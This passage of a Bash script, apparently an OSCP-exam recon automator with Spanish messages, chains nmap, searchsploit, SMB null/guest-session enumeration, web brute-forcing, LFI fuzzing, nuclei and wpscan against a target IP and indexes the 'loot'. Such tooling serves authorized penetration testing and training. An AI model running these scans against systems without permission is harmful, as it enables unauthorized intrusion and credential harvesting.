                    elif [[ "$_n" == "SMB-NXC" ]]; then _wname="NXC-SMB";
                    elif [[ "$_n" == "LDAP" ]]; then _wname="LDAPEnum";
                    elif [[ "$_n" == "AS-REP Roast" ]]; then _wname="ASREProast";
                    elif [[ "$_n" == "SNMP-walk" ]]; then _wname="SNMPEnum";
                    elif [[ "$_n" =~ DB- ]]; then _wname="DBEnum";
                    elif [[ "$_n" == "RDP-Nmap" || "$_n" == "WinRM-Nmap" ]]; then _wname="RemoteEnum"; fi
                    
                    if [[ -n "$_wname" ]] && tmux has-session -t "${TMUX_SESSION}:${_wname}" 2>/dev/null; then
                        tmux kill-window -t "${TMUX_SESSION}:${_wname}" 2>/dev/null
                        log_info "  - Eliminado: $_wname"
                    fi
                done
            else
                log_info "Los scans seguirán en tmux. Revisa con: ${WHITE}tmux attach -t $TMUX_SESSION${NC}"
            fi
        fi
    fi

    log_ok "Background scans finalizados."
    # Mark all background steps as done (they ran in tmux)
    for _bg_step in s08 s09 s10 s11 s15 s16 s17 s18; do
        [[ -f "$LOOT_DIR/.status/${_bg_step}.status" ]] && \
            grep -q "^RUNNING" "$LOOT_DIR/.status/${_bg_step}.status" && step_done "$_bg_step"
    done
    echo ""

    # Now parse all findings with real data from ALL directories
    log_section "Step 20/20 (cont): Parsing All Findings"
    for _dir in scans smb web ldap db remote smtp dns mail ftp banners; do
        [[ -d "$LOOT_DIR/$_dir" ]] || continue
        for logfile in "$LOOT_DIR/$_dir"/*.txt "$LOOT_DIR/$_dir"/*.nmap; do
            [[ -f "$logfile" ]] && parse_scan_findings "$logfile" "$(basename "$logfile" .txt)" 2>/dev/null
        done
    done

    # -- Step 15: Auto-Searchsploit against nmap XML -----------------------------
    log_section "Step 20/20 (cont): Auto-Exploit Search (Searchsploit)"
    mkdir -p "$LOOT_DIR/exploit"
    if [[ -f "$LOOT_DIR/scans/targeted.xml" ]]; then
        if command -v searchsploit &>/dev/null; then
            log_run "searchsploit --nmap $LOOT_DIR/scans/targeted.xml"
            searchsploit --nmap "$LOOT_DIR/scans/targeted.xml" 2>&1 | tee "$LOOT_DIR/exploit/searchsploit_auto.txt"
            local sploit_count=""
            if [[ -f "$LOOT_DIR/exploit/searchsploit_auto.txt" ]]; then
                sploit_count=$(grep -c '|' "$LOOT_DIR/exploit/searchsploit_auto.txt" 2>/dev/null | grep -o '[0-9]*' | head -n1)
            fi
            [[ -z "$sploit_count" ]] && sploit_count=0
            
            if [[ "$sploit_count" -gt 3 ]]; then
                add_finding "💣 Searchsploit: $((sploit_count - 3)) exploits potenciales encontrados en Nmap XML (ver exploit/searchsploit_auto.txt)"
            fi

            # Also search by detected CMS name if available
            if [[ -n "$CMS_DETECTED" && "$CMS_DETECTED" != "Unknown" ]]; then
                log_info "Buscando exploits específicos para CMS: ${WHITE}$CMS_DETECTED${NC}"
                searchsploit "$CMS_DETECTED" 2>&1 | tee "$LOOT_DIR/exploit/searchsploit_cms.txt"
                local cms_count=""
                if [[ -f "$LOOT_DIR/exploit/searchsploit_cms.txt" ]]; then
                    cms_count=$(grep -c '|' "$LOOT_DIR/exploit/searchsploit_cms.txt" 2>/dev/null | grep -o '[0-9]*' | head -n1)
                fi
                [[ -z "$cms_count" ]] && cms_count=0
                
                if [[ "$cms_count" -gt 3 ]]; then
                    add_finding "💣 Searchsploit CMS ($CMS_DETECTED): $((cms_count - 3)) exploits encontrados"
                fi
            fi

            # Search by specific service versions detected
            if [[ ${#SERVICES_VERSION[@]} -gt 0 ]]; then
                for svc in "${SERVICES_VERSION[@]}"; do
                    local svc_name svc_ver
                    svc_name=$(echo "$svc" | cut -d: -f2)
                    svc_ver=$(echo "$svc" | cut -d: -f3 | xargs)
                    if [[ -n "$svc_ver" && "$svc_ver" != " " ]]; then
                        log_info "Buscando exploits para: ${WHITE}$svc_name $svc_ver${NC}"
                        searchsploit "$svc_name $svc_ver" 2>&1 | tee -a "$LOOT_DIR/exploit/searchsploit_services.txt"
                    fi
                done
            fi
        else
            log_warn "searchsploit no instalado. Instala: sudo apt install exploitdb"
        fi
    else
        log_warn "No hay targeted.xml. Ejecuta [3] Deep Scan primero."
    fi

    # -- Generate loot index -------------------------------------------------
    generate_loot_index

    # -- Summary ---------------------------------------------------------------
    separator
    step_done s20
    log_ok "${BOLD}Auto-Recon complete! (20/20 steps)${NC}"
    echo ""
    log_ok "Índice generado: ${WHITE}$LOOT_DIR/README.md${NC}"
    echo -e "  ${CYAN}Abre README.md para ver un resumen organizado de TODOS los resultados.${NC}"
    echo ""
    read -rp "  Press ENTER to continue..."
}

# -- Loot Index Generator -----------------------------------------------------
generate_loot_index() {
    [[ -z "$LOOT_DIR" || ! -d "$LOOT_DIR" ]] && return
    local idx="$LOOT_DIR/README.md"
    local now
    now=$(date '+%Y-%m-%d %H:%M:%S')

    cat > "$idx" <<HEREDOC
# 🎯 Índice de Resultados — $IP
**OS:** $OS_TARGET | **Puertos TCP:** $PORTS | **Generado:** $now

---

## 📡 1. Reconocimiento (Puertos y OS)
HEREDOC

    # Recon files
    [[ -f "$LOOT_DIR/scans/allports.txt" ]] && echo "- [Escaneo TCP completo (65535 puertos)](scans/allports.txt)" >> "$idx"
    [[ -f "$LOOT_DIR/scans/udp.txt" ]] && echo "- [Escaneo UDP top 20](scans/udp.txt)" >> "$idx"
    [[ -f "$LOOT_DIR/scans/open_ports.txt" ]] && echo "- [Lista de puertos abiertos](scans/open_ports.txt) — \`$(cat "$LOOT_DIR/scans/open_ports.txt" | paste -sd, 2>/dev/null)\`" >> "$idx"

    # Deep scan
    echo "" >> "$idx"
    echo "## 🔍 2. Enumeración Profunda" >> "$idx"
    [[ -f "$LOOT_DIR/scans/targeted.nmap" ]] && echo "- [Nmap detallado (-sC -sV -O)](scans/targeted.nmap) — **versiones y scripts**" >> "$idx"
    [[ -f "$LOOT_DIR/scans/targeted.xml" ]] && echo "- [Nmap XML (para searchsploit)](scans/targeted.xml)" >> "$idx"

    # Per-service sections
    local _sections=(
        "ssh:🔑 SSH:scans/ssh_auth_methods.txt"
        "web:🌐 Web:web"
        "smb:📁 SMB:smb"
        "ldap:🏢 LDAP / Active Directory:ldap"
        "db:🗄️ Bases de Datos:db"
        "smtp:📮 SMTP:smtp"
        "mail:📧 Correo (IMAP/POP3):mail"
        "remote:🖥️ Acceso Remoto (RDP/WinRM):remote"
        "dns:🌍 DNS:dns"
        "ftp:📂 FTP:ftp"
    )

    for _sec in "${_sections[@]}"; do
        local _key="${_sec%%:*}"
        local _rest="${_sec#*:}"
        local _icon="${_rest%%:*}"
        local _path="${_rest#*:}"

        # Check if directory has files or single file exists
        local _has_content=false
        if [[ -d "$LOOT_DIR/$_path" ]]; then
            local _fcount
            _fcount=$(find "$LOOT_DIR/$_path" -name "*.txt" -o -name "*.nmap" 2>/dev/null | wc -l)
            [[ "$_fcount" -gt 0 ]] && _has_content=true
        elif [[ -f "$LOOT_DIR/$_path" ]]; then
            _has_content=true
        fi

        if $_has_content; then
            echo "" >> "$idx"
            echo "### $_icon" >> "$idx"
            if [[ -d "$LOOT_DIR/$_path" ]]; then
                for _f in "$LOOT_DIR/$_path"/*.txt "$LOOT_DIR/$_path"/*.nmap; do
                    [[ -f "$_f" ]] || continue
                    local _fname
                    _fname=$(basename "$_f")
                    local _fsize
                    _fsize=$(wc -c < "$_f" 2>/dev/null)
                    if [[ "$_fsize" -gt 10 ]]; then
                        echo "- [\`$_fname\`]($_path/$_fname)" >> "$idx"
                    fi
                done
            else
                local _fname
                _fname=$(basename "$_path")
                echo "- [\`$_fname\`]($_path)" >> "$idx"
            fi
        fi
    done

    # Vulnerabilities
    echo "" >> "$idx"
    echo "## 🚨 3. Vulnerabilidades" >> "$idx"
    [[ -f "$LOOT_DIR/scans/vulns.txt" ]] && echo "- [Nmap Vuln Scan completo](scans/vulns.txt)" >> "$idx"
    # Extract actual CVEs for quick reference
    if [[ -f "$LOOT_DIR/scans/vulns.txt" ]]; then
        local _cves
        _cves=$(grep -iP 'CVE-\d{4}-\d+' "$LOOT_DIR/scans/vulns.txt" 2>/dev/null | grep -iv 'NOT VULNERABLE' | grep -oP 'CVE-\d{4}-\d+' | sort -u)
        if [[ -n "$_cves" ]]; then
            echo "- **CVEs confirmados:**" >> "$idx"
            while IFS= read -r _cve; do
                echo "  - 🔴 \`$_cve\` → [buscar en Google](https://www.google.com/search?q=$_cve+exploit)" >> "$idx"
            done <<< "$_cves"
        fi
    fi

    # Exploits
    echo "" >> "$idx"
    echo "## 💣 4. Exploits" >> "$idx"
    [[ -f "$LOOT_DIR/exploit/searchsploit_auto.txt" ]] && echo "- [Searchsploit automático](exploit/searchsploit_auto.txt)" >> "$idx"
    [[ -f "$LOOT_DIR/exploit/searchsploit_services.txt" ]] && echo "- [Searchsploit por servicio](exploit/searchsploit_services.txt)" >> "$idx"
    local _exploit_count
    _exploit_count=$(find "$LOOT_DIR/exploit" -name "*.py" -o -name "*.c" -o -name "*.rb" -o -name "*.sh" 2>/dev/null | wc -l)
    [[ "$_exploit_count" -gt 0 ]] && echo "- **$_exploit_count exploit(s) descargado(s)** en \`exploit/\`" >> "$idx"

    # Credentials
    echo "" >> "$idx"
    echo "## 🔑 5. Credenciales Encontradas" >> "$idx"
    if [[ -d "$LOOT_DIR/creds" ]] && [[ $(find "$LOOT_DIR/creds" -name "*.txt" 2>/dev/null | wc -l) -gt 0 ]]; then
        for _f in "$LOOT_DIR/creds"/*.txt; do
            [[ -f "$_f" ]] && echo "- [\`$(basename "$_f")\`](creds/$(basename "$_f"))" >> "$idx"
        done
    else
        echo "- _Ninguna credencial encontrada todavía_" >> "$idx"
    fi

    # Findings summary
    echo "" >> "$idx"
    echo "## ⚠️ 6. Hallazgos Críticos (Resumen)" >> "$idx"
    if [[ ${#FINDINGS[@]} -gt 0 ]]; then
        echo "**${#FINDINGS[@]} hallazgo(s) detectado(s):**" >> "$idx"
        echo "" >> "$idx"
        for _f in "${FINDINGS[@]}"; do
            local _clean
            _clean=$(echo "$_f" | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' | head -c 120)
            echo "- $_clean" >> "$idx"
        done
    else
        echo "- _Sin hallazgos todavia — ejecuta \`[A]\` Auto-Recon_" >> "$idx"
    fi

    # Evidence
    echo "" >> "$idx"
    echo "---" >> "$idx"
    echo "## 📋 Evidencia y Logs" >> "$idx"
    echo "- [📝 **Log de TODOS los comandos ejecutados**](OSCP_Commands_Log.md) ← ⭐ para el reporte OSCP" >> "$idx"
    echo "- [📊 Log de sesión completo](session.log)" >> "$idx"
    echo "" >> "$idx"
    echo "_Generado automáticamente por OSCP Enum Script v3.0_" >> "$idx"

    log_ok "Índice generado: ${WHITE}$idx${NC}"
    
    # Clean up temporary tmux logs
    rm -f "$LOOT_DIR"/.tmux_*.log 2>/dev/null
}

# =============================================================================
# -- Session Rehydration (Unified) ---------------------------------------------
# =============================================================================
rehydrate_session() {
    # Unified session restoration — called from both main() and setup_config()
    [[ -z "$LOOT_DIR" || ! -d "$LOOT_DIR" ]] && return

    # Recover open TCP ports
    [[ -f "$LOOT_DIR/scans/open_ports.txt" ]] && PORTS=$(cat "$LOOT_DIR/scans/open_ports.txt" | tr -d '\r')
    # Recover UDP ports
    [[ -f "$LOOT_DIR/scans/open_ports_udp.txt" ]] && PORTS_UDP=$(cat "$LOOT_DIR/scans/open_ports_udp.txt" | tr -d '\r')

    # Recover Web CMS (explicit cache first, heuristics fallback)
    if [[ -f "$LOOT_DIR/.cms_cache.txt" ]]; then
        CMS_DETECTED=$(cat "$LOOT_DIR/.cms_cache.txt" | tr -d '\r')
    else
        local _rehyd_proto="http"
        [[ -n "$PORTS" ]] && echo ",$PORTS," | grep -q ",443," && _rehyd_proto="https"
        [[ -d "$LOOT_DIR/web" ]] && \
            grep -qi 'wordpress\|joomla\|drupal' "$LOOT_DIR/web/"*.txt 2>/dev/null && \
            detect_cms "${_rehyd_proto}://$IP" >/dev/null 2>&1
    fi

    # Recover service versions for dashboard
    [[ -f "$LOOT_DIR/scans/targeted.nmap" ]] && parse_service_versions "$LOOT_DIR/scans/targeted.nmap"

    # Pre-populate dashboard findings (only parses changed files thanks to mtime check)
    refresh_dashboard_data >/dev/null 2>&1

    # Harvest findings
    if command -v $NXC &>/dev/null; then
        tmux_run "NXC-SMB" \
            "echo '[*] NXC SMB null sessions...'; \
             $NXC smb $IP --shares -u '' -p '' 2>&1 | tee $LOOT_DIR/smb/nxc_shares.txt; \
             $NXC smb $IP --users -u '' -p '' 2>&1 | tee $LOOT_DIR/smb/nxc_users.txt; \
             $NXC smb $IP --pass-pol -u '' -p '' 2>&1 | tee $LOOT_DIR/smb/nxc_passpol.txt; \
             echo '[*] NXC SMB guest sessions...'; \
             $NXC smb $IP --shares -u 'guest' -p '' 2>&1 | tee -a $LOOT_DIR/smb/nxc_shares.txt; \
             $NXC smb $IP --users -u 'guest' -p '' 2>&1 | tee -a $LOOT_DIR/smb/nxc_users.txt; \
             echo '[+] NXC SMB Enum completado.'" \
            "$LOOT_DIR/smb/nxc_shares.txt"
    fi

    log_info "Recuperando hallazgos de memoria muerta (Parsers)..."
    local _scan_dirs=("scans" "web" "smb" "ftp" "dns" "mail" "db" "remote" "exploit" "ldap" "ad" "smtp" "creds")
    for _sd in "${_scan_dirs[@]}"; do
        if [[ -d "$LOOT_DIR/$_sd" ]]; then
            for df in "$LOOT_DIR/$_sd"/*.txt "$LOOT_DIR/$_sd"/*.nmap; do
                [[ -f "$df" ]] && parse_scan_findings "$df" "Session Load" >/dev/null 2>&1
            done
        fi
    done

    log_ok "Sesión restaurada. (TCP: ${PORTS:-Ninguno} | UDP: ${PORTS_UDP:-Ninguno})"
}

# =============================================================================
# -- 0. Setup ------------------------------------------------------------------
# =============================================================================
setup_config() {
    banner
    log_section "SETUP — TARGET CONFIGURATION"

    read -rp "  $(echo -e "${CYAN}Target IP${NC}: ")" input_ip
    [[ -n "$input_ip" ]] && IP="$input_ip"

    read -rp "  $(echo -e "${CYAN}AD Domain${NC} (leave blank if none): ")" input_domain
    [[ -n "$input_domain" ]] && DOMAIN="$input_domain"

    read -rp "  $(echo -e "${CYAN}Username${NC} (optional): ")" input_user
    [[ -n "$input_user" ]] && USER_CRED="$input_user"

    read -rp "  $(echo -e "${CYAN}Password${NC} (optional): ")" input_pass
    [[ -n "$input_pass" ]] && PASS_CRED="$input_pass"

    # Create loot directory structure
    LOOT_DIR="loot_${IP//./_}"
    mkdir -p "$LOOT_DIR"/{scans,web,smb,creds,exploit,screenshots,ldap,db,tools,notes}

    SESSION_LOG="$LOOT_DIR/session.log"

    # -- Session Resume (Rehydration) --
    if [[ -f "$LOOT_DIR/session.log" ]]; then
        log_info "Historial detectado. Rehidratando sesión desde disco..."
        rehydrate_session
        echo "===== Session resumed $(date) — Target: $IP =====" >> "$SESSION_LOG"
    else
        # Initialise fresh session log
        echo "===== Session started $(date) — Target: $IP =====" > "$SESSION_LOG"
        log_ok "Workspace created: ${WHITE}$(pwd)/$LOOT_DIR${NC}"
        log_ok "Session log: ${WHITE}$SESSION_LOG${NC}"
    fi

    # Auto OS detection via TTL
    log_info "Running OS detection via TTL..."
    detect_os

    # Optional /etc/hosts entry
    if [[ -n "$DOMAIN" ]]; then
        log_warn "Add '$IP $DOMAIN' to /etc/hosts? [y/N]"
        read -rp "  " add_hosts
        if [[ "$add_hosts" =~ ^[Yy]$ ]]; then
            echo "$IP $DOMAIN" | sudo tee -a /etc/hosts
            log_ok "Added to /etc/hosts"
        fi
    fi

    # -- Wordlist check: offer download if none found
    if [[ -z "$WORDLIST_MEDIUM" ]]; then
        echo ""
        log_warn "No se encontró ninguna wordlist para Gobuster."
        echo -e "  ${YELLOW}Opciones:${NC}"
        echo -e "  1. ${WHITE}sudo apt install seclists${NC}  (recomendado, incluye muchas listas)"
        echo -e "  2. ${WHITE}Descargar jhaddix all-in-one${NC} (~373k rutas, el mejor)"
        echo ""
        read -rp "  $(echo -e "${CYAN}¿Descargar diccionario jhaddix ahora? (necesita internet) [y/N]:${NC} ")" dl_wl
        if [[ "$dl_wl" =~ ^[Yy]$ ]]; then
            log_info "Descargando jhaddix content_discovery_all.txt..."
            sudo mkdir -p /usr/share/wordlists
            sudo wget -q --show-progress \
                -O /usr/share/wordlists/content_discovery_all.txt \
                "https://gist.githubusercontent.com/jhaddix/b80ea67d85c13206125806f0828f4d10/raw/c81a34fe84731430741e0463eb6076129c20c4c0/content_discovery_all.txt" \
                2>&1
            WORDLIST_MEDIUM="/usr/share/wordlists/content_discovery_all.txt"
            log_ok "Wordlist lista: ${WHITE}$WORDLIST_MEDIUM${NC}"
        else
            log_warn "Sin wordlist. Gobuster no podrá ejecutarse. Instala seclists para solucionar."
        fi
    else
        log_ok "Wordlist: ${WHITE}$WORDLIST_MEDIUM${NC}"
    fi

    separator
    log_ok "Setup complete. OS: ${WHITE}${OS_ICON} ${OS_TARGET}${NC}"
    echo ""; read -rp "  Press ENTER to continue..."
}

# =============================================================================
# -- 1. Host Discovery ---------------------------------------------------------
# =============================================================================
host_discovery() {
    require_ip || return
    banner
    log_section "HOST DISCOVERY & OS FINGERPRINTING"

    echo -e "  ${WHITE}[1]${NC} Ping + TTL (re-run OS auto-detection)"
    echo -e "  ${WHITE}[2]${NC} Nmap full OS detection (-O)"
    echo -e "  ${WHITE}[3]${NC} Network sweep /24"
    echo -e "  ${WHITE}[4]${NC} All of the above"
    echo -e "  ${WHITE}[b]${NC} Back"
    echo ""
    read -rp "  Option: " choice

    case $choice in
        1)
            detect_os
            ;;
        2)
            run_cmd "Nmap OS detection" \
                "sudo nmap -O --osscan-guess -Pn $IP -oN $LOOT_DIR/scans/os.txt" \
                "$LOOT_DIR/scans/os.txt"
            ;;
        3)
            local subnet="${IP%.*}.0/24"
            run_cmd "Network sweep" \
                "nmap -sn $subnet -oN $LOOT_DIR/scans/hosts_up.txt" \
                "$LOOT_DIR/scans/hosts_up.txt"
            log_ok "Live hosts saved to $LOOT_DIR/scans/hosts_up.txt"
            ;;
        4)
            detect_os
            run_cmd "Nmap OS detection" \
                "sudo nmap -O --osscan-guess -Pn $IP -oN $LOOT_DIR/scans/os.txt" \
                "$LOOT_DIR/scans/os.txt"
            local subnet="${IP%.*}.0/24"
            run_cmd "Network sweep" \
                "nmap -sn $subnet -oN $LOOT_DIR/scans/hosts_up.txt" \
                "$LOOT_DIR/scans/hosts_up.txt"
            ;;
        b|B) return ;;
    esac

    echo ""; read -rp "  Press ENTER to continue..."
}

# =============================================================================
# -- 2. Fast Port Scan ---------------------------------------------------------
# =============================================================================
fast_port_scan() {
    require_ip   || return
    require_loot || return
    banner
    log_section "FAST PORT SCAN — ALL PORTS (AUTO)"

    local fast_out="$LOOT_DIR/scans/allports.txt"

    if command -v rustscan &>/dev/null; then
        run_cmd "Rustscan (all ports)" \
            "rustscan -a $IP --ulimit 5000 -- -sS -Pn -n -oN $fast_out" \
            ""
    else
        log_warn "Rustscan not found — using Nmap optimized fallback."
        run_cmd "Nmap (all ports)" \
            "nmap -p- --open -sS --min-rate 5000 -n -Pn $IP -oN $fast_out" \
            ""
    fi

    # Auto-extract ports — deduplicate with sort -u to avoid "22,80,22,80" when file is appended
    PORTS=$(awk -F/ '/^[0-9]+\/tcp[ \t]+open[ \t]+/ {print $1}' "$fast_out" 2>/dev/null | sort -un | paste -sd, -)
    if [[ -z "$PORTS" ]]; then
        PORTS=$(grep -i "Open " "$fast_out" 2>/dev/null | grep -oP ':\K\d+' | sort -un | paste -sd, -)
    fi

    if [[ -n "$PORTS" ]]; then
        echo "$PORTS" > "$LOOT_DIR/scans/open_ports.txt"
        log_ok "Ports extracted: ${WHITE}$PORTS${NC}"
    else
        log_error "Could not auto-extract ports or no open ports found."
        read -rp "  Enter ports manually if known (e.g. 22,80,443): " PORTS
        [[ -n "$PORTS" ]] && echo "$PORTS" > "$LOOT_DIR/scans/open_ports.txt"
    fi
}

# =============================================================================
# -- 3. Deep Service Scan ------------------------------------------------------
# =============================================================================
deep_scan() {
    require_ip    || return
    require_loot  || return
    require_ports || return
    banner
    log_section "DEEP SERVICE SCAN — PORTS: $PORTS (AUTO)"

    run_cmd "Service & Default Scripts (-sC -sV -O)" \
        "sudo nmap -p$PORTS -sC -sV -O -Pn $IP -oA $LOOT_DIR/scans/targeted" \
        "$LOOT_DIR/scans/targeted.nmap"

    # Vuln scan — run in background via tmux, -sV is critical for script accuracy
    log_info "Launching vuln scan in tmux background..."
    tmux_run "VulnScan" \
        "nmap -p$PORTS -sV --script vuln -Pn $IP -oN $LOOT_DIR/scans/vulns.txt" \
        "$LOOT_DIR/scans/vulns.txt"
    
    # Parse findings
    parse_service_versions "${LOOT_DIR}/scans/targeted.nmap"
    parse_scan_findings "${LOOT_DIR}/scans/targeted.nmap" "Deep Scan"
}


# =============================================================================
# -- 4. SMB Enumeration --------------------------------------------------------
# =============================================================================
smb_enum() {
    require_ip   || return
    require_loot || return
    banner
    log_section "SMB ENUMERATION (AUTO)"

    tmux_run "SMBEnum" \
        "mkdir -p $LOOT_DIR/smb; touch $LOOT_DIR/smb/nmap_smb.txt; \
         echo '[*] Nmap SMB scripts...'; nmap -p445,139 --script 'smb-vuln*,smb-enum-shares,smb-enum-users,smb-os-discovery,smb2-security-mode,smb-protocols' -Pn $IP -oN $LOOT_DIR/smb/nmap_smb.txt; \
         echo '[*] enum4linux-ng...'; enum4linux-ng -A $IP 2>&1 | tee $LOOT_DIR/smb/enum4linux.txt; \
         echo '[*] smbmap...'; smbmap -H $IP -u '' -p '' --no-banner 2>&1 | tee $LOOT_DIR/smb/smbmap.txt; \
         echo '[*] smbmap recursive null...'; smbmap -H $IP -u '' -p '' -R 2>&1 | tee $LOOT_DIR/smb/smbmap_null_recursive.txt; \
             echo '[*] smbmap recursive guest...'; smbmap -H $IP -u 'guest' -p '' -R 2>&1 | tee $LOOT_DIR/smb/smbmap_guest_recursive.txt; \
         echo '[*] smbclient null session...'; smbclient -L //$IP -N 2>&1 | tee $LOOT_DIR/smb/smbclient.txt; \
         echo '[*] rpcclient null session...'; rpcclient -U '' -N $IP -c 'enumdomusers; enumdomgroups; querydispinfo' 2>&1 | tee $LOOT_DIR/smb/rpcclient.txt; \
         if [ -f $LOOT_DIR/../smb_spider.sh ]; then bash $LOOT_DIR/../smb_spider.sh $IP $LOOT_DIR; \
         elif [ -f ./smb_spider.sh ]; then bash ./smb_spider.sh $IP $LOOT_DIR; \
         else echo '[-] smb_spider.sh not found, skipping share crawl'; fi; \
         echo '[+] SMB Enum completado.'" \
        "$LOOT_DIR/smb/nmap_smb.txt"

    if command -v $CME &>/dev/null; then
        tmux_run "NXC-SMB" \
            "echo '[*] $CME SMB enum...'; \
             $NXC smb $IP --shares -u '' -p '' 2>&1 | tee $LOOT_DIR/smb/nxc_shares.txt; \
             $NXC smb $IP --users -u '' -p '' 2>&1 | tee $LOOT_DIR/smb/nxc_users.txt; \
             $NXC smb $IP --pass-pol -u '' -p '' 2>&1 | tee $LOOT_DIR/smb/nxc_passpol.txt; \
             echo '[+] $CME completado.'" \
            "$LOOT_DIR/smb/nxc_shares.txt"
    fi

    log_ok "SMB Enumeration launched in background tmux sessions."
    echo ""; read -rp "  Press ENTER to continue..."
}


# =============================================================================
# -- 5. Web Enumeration (Enhanced) ---------------------------------------------
# =============================================================================
web_enum() {
    require_ip   || return
    require_loot || return
    banner
    log_section "WEB ENUMERATION (AUTO)"

    # Detect web protocol from known ports
    local web_ports=()
    if [[ -n "$PORTS" ]]; then
        IFS=',' read -ra port_arr <<< "$PORTS"
        for p in "${port_arr[@]}"; do
            # common web ports
            local _is_web=false
            for _kwp in "${KNOWN_WEB_PORTS[@]}"; do [[ "$p" == "$_kwp" ]] && _is_web=true; done
            if $_is_web; then
                web_ports+=("$p")
            fi
        done
    fi
    
    if [[ ${#web_ports[@]} -eq 0 ]]; then
        log_warn "No standard web ports detected in \$PORTS. Falling back to port 80."
        web_ports=("80")
    fi

    local wl="$WORDLIST_MEDIUM"
    for p in "${web_ports[@]}"; do
        local proto="http"
        [[ "$p" == "443" || "$p" == "8443" ]] && proto="https"
        local base_url="${proto}://${IP}:${p}"
        local p_suffix="_port${p}"

        log_info "Starting enumeration for ${WHITE}$base_url${NC}..."

        log_run "WhatWeb" "whatweb $base_url -a 3 2>&1 | tee $LOOT_DIR/web/whatweb${p_suffix}.txt"
        whatweb "$base_url" -a 3 2>&1 | tee "$LOOT_DIR/web/whatweb${p_suffix}.txt"

        log_run "Headers" "curl -sI $base_url | tee $LOOT_DIR/web/headers${p_suffix}.txt"
        curl -ksI "$base_url" | tee "$LOOT_DIR/web/headers${p_suffix}.txt"
        
        # Auto CMS detection
        detect_cms "$base_url"
        
        # 1. Directory brute-forcing (Feroxbuster o Gobuster)
        if command -v feroxbuster &>/dev/null; then
            tmux_run "Ferox_${p}" \
                "feroxbuster -u $base_url -w $wl -x php,html,txt,asp,aspx,bak -t 50 -k -q -d 2 --filter-status 403 -o $LOOT_DIR/web/feroxbuster${p_suffix}.txt" \
                "$LOOT_DIR/web/feroxbuster${p_suffix}.txt"
        else
            tmux_run "Gobust_${p}" \
                "gobuster dir -u $base_url -w $wl -x php,html,txt,asp,aspx,bak -t 50 --no-error -k -o $LOOT_DIR/web/gobuster${p_suffix}.txt" \
                "$LOOT_DIR/web/gobuster${p_suffix}.txt"
        fi

        # 2. Nikto
        tmux_run "Nikto_${p}" \
            "nikto -h $base_url -ask no -maxtime $NIKTO_MAXTIME_QUICK -timeout 10 -output $LOOT_DIR/web/nikto${p_suffix}.txt" \
            "$LOOT_DIR/web/nikto${p_suffix}.txt"

        # 3. FFUF (VHOST / Parameter Discovery)
        if command -v ffuf &>/dev/null; then
            if [[ -n "$DOMAIN" ]]; then
                tmux_run "FFUF_VHost_${p}" \
                    "ffuf -u "${_rehyd_proto}://$IP/" -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403 -fs 0 -ac -o $LOOT_DIR/web/ffuf_vhost$p_suffix.txt 2>/dev/null" \
                    "$LOOT_DIR/web/ffuf_vhost$p_suffix.txt"
            fi
            local _lfi_wl="/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt"
            [[ ! -f "$_lfi_wl" ]] && _lfi_wl="/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt"
            if [[ -f "$_lfi_wl" ]]; then
                tmux_run "FFUF_${p}" \
                    "ffuf -u \"$base_url/FUZZ\" -w \"$_lfi_wl\" -c -mc 200 -t 40 -ic -v -o $LOOT_DIR/web/ffuf_lfi${p_suffix}.txt 2>/dev/null" \
                    "$LOOT_DIR/web/ffuf_lfi${p_suffix}.txt"
            fi
        fi

        # 4. Nuclei
        if command -v nuclei &>/dev/null; then
            tmux_run "Nuclei_${p}" \
                "nuclei -u $base_url -t cves/ -t default-logins/ -t exposed-panels/ -t misconfiguration/ -t vulnerabilities/ -severity critical,high,medium -o $LOOT_DIR/web/nuclei${p_suffix}.txt" \
                "$LOOT_DIR/web/nuclei${p_suffix}.txt"
        fi

        # 5. WPScan (Si es WordPress)
        if grep -qPi 'wordpress|wp-content|wp-includes' "$LOOT_DIR/web/whatweb${p_suffix}.txt" 2>/dev/null || grep -qPi 'wordpress' "$LOOT_DIR/web/headers${p_suffix}.txt" 2>/dev/null; then
            tmux_run "WPScan_${p}" \
                "wpscan --url $base_url -e u,vp,vt --plugins-detection mixed --api-token \$WPSCAN_API_TOKEN -o $LOOT_DIR/web/wpscan${p_suffix}.txt" \
                "$LOOT_DIR/web/wpscan${p_suffix}.txt"
        fi

        # -- Redirect Host Discovery (inspirado en AutoRecon) --
        log_info "Checking HTTP redirects for hostname discovery..."
        local _redir_header
        _redir_header=$(curl -ksI -o /dev/null -w '%{redirect_url}' --max-time 5 "$base_url" 2>/dev/null)
        if [[ -n "$_redir_header" ]]; then
            local _redir_host
            _redir_host=$(echo "$_redir_header" | sed -E 's|https?://([^/:]+).*|\1|')
            if [[ -n "$_redir_host" ]] && [[ "$_redir_host" != "$IP" ]] && ! echo "$_redir_host" | grep -qP '^\d+\.\d+\.\d+\.\d+$'; then
                log_ok "🔀 Redirect detectado: ${WHITE}$base_url${NC} → ${YELLOW}$_redir_header${NC}"
                log_ok "   Hostname encontrado: ${BOLD}$_redir_host${NC}"
                echo "$_redir_host" >> "$LOOT_DIR/web/discovered_hostnames.txt"
                add_finding "REDIRECT: $base_url → $_redir_header (hostname: $_redir_host)"
                # Check if already in /etc/hosts
                if ! grep -qP "^\s*${IP}\s.*\b${_redir_host}\b" /etc/hosts 2>/dev/null; then
                    echo ""
                    log_warn "⚠️  ${YELLOW}$_redir_host${NC} NO está en /etc/hosts"
                    read -rp "  $(echo -e "${CYAN}¿Añadir '$IP $_redir_host' a /etc/hosts? [S/n]:${NC} ")" _add_host
                    if [[ ! "$_add_host" =~ ^[nN]$ ]]; then
                        echo "$IP    $_redir_host" | sudo tee -a /etc/hosts > /dev/null
                        log_ok "✅ Añadido a /etc/hosts: ${WHITE}$IP $_redir_host${NC}"
                        # Set DOMAIN if not set
                        if [[ -z "$DOMAIN" ]]; then
                            DOMAIN="$_redir_host"
                            log_info "DOMAIN auto-configurado: ${WHITE}$DOMAIN${NC}"
                        fi
                    fi
                else
                    log_ok "$_redir_host ya está en /etc/hosts ✅"
                fi
            fi
        else
            log_info "Sin redirección detectada en $base_url"
        fi

        # -- VHost / Subdomain Enumeration --
        if [[ -n "$DOMAIN" ]] && command -v gobuster &>/dev/null; then
            local _vhost_wl="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
